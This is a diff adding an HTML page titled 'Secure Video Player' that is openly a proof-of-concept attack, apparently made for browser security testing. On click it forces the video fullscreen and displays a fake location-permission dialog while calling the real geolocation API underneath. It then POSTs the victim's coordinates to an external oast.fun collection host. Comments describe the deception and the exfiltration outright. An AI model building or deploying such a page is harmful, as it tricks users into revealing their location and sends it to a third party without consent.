@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Secure Video Player</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background-color: black;
+    }
+    #fakePrompt {
+      position: absolute;
+      bottom: 50px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #f9f9f9;
+      border: 1px solid #aaa;
+      padding: 15px;
+      font-family: system-ui, sans-serif;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      z-index: 9999;
+    }
+    #fakePrompt button {
+      margin: 5px;
+      padding: 5px 10px;
+    }
+  </style>
+</head>
+<body>
+  <video id="vid" src="https://www.w3schools.com/html/mov_bbb.mp4" controls autoplay style="width:100%;height:auto"></video>
+
+  <div id="fakePrompt" hidden>
+    <p>"example.com" Would Like to Access Your Location</p>
+    <button onclick="fakeAllow()">Allow</button>
+    <button onclick="fakeDeny()">Don't Allow</button>
+  </div>
+
+  <script>
+    async function enterExploitMode() {
+      const vid = document.getElementById('vid');
+      await vid.requestFullscreen();
+
+      // Slight delay for better visual deception
+      setTimeout(() => {
+        document.getElementById('fakePrompt').hidden = false;
+
+        // Trigger the real prompt underneath
+        navigator.geolocation.getCurrentPosition(function(pos) {
+          // Exfiltrate real location after spoof
+          fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
+            method: "POST",
+            body: JSON.stringify({
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              source: "fullscreen-overlay"
+            }),
+            headers: {
+              'Content-Type': 'application/json'
+            }
+          });
+        });
+      }, 1200);
+    }
+
+    function fakeAllow() {
+      alert("You clicked Allow (fake)");
+    }
+
+    function fakeDeny() {
+      alert("You clicked Deny (fake)");
+    }
+
+    // Launch after a user click (bypass fullscreen restrictions)
+    document.body.addEventListener('click', enterExploitMode);
+  </script>
+</body>
+</html>
